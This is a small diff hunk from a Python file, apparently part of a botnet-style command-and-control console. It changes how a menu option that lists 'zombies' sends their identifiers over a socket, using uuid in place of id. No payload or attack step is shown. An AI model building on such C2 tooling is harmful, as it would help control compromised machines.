@@ -43,7 +43,7 @@ def start():
 			if choice == 0:
 			# List zombies
                         	for z in listener.zombies:
-                                	clientsocket.send(z.id.encode())				
+                                	clientsocket.send(z.uuid.encode())				
 			if choice == 1:
 				# Exit
 				clientsocket.close()
